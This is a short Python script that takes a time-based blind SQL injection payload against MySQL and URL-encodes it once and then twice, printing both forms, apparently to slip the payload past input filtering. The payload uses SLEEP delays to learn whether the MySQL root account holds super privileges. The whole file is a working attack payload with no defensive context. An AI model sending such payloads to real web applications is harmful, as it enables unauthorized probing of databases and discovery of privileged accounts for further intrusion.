from urllib.parse import quote
from urllib.parse import urlencode


a = "' AND (SELECT 2634 FROM (SELECT(SLEEP(2-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,2)))))aoEO) AND 'OpQi'='OpQi"

b = quote(a)
c = quote(b)


print(b + '\n' + c)